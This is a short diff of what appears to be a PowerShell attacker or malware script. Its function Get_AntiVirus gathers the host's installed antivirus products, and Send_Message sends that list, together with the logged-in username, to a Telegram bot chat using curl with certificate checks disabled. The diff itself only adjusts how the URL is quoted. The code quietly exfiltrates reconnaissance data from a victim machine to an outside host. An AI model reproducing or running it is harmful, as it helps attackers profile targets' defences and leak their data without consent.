@@ -20,7 +20,9 @@ function Get_AntiVirus{
 
 function Send_Message(){
 	$url = "https://api.telegram.org/bot" + $token + "/sendMessage?text=" + $message + "--$env:Username--&chat_id=" + $chat_id;
-	cmd.exe /c curl $url -s -k;
+	$url = '"' + $url.replace(" ","%20") + '"'
+	cmd.exe /c curl $url -s -k ;
+
 }
 $message = Get_AntiVirus;
 Send_Message;
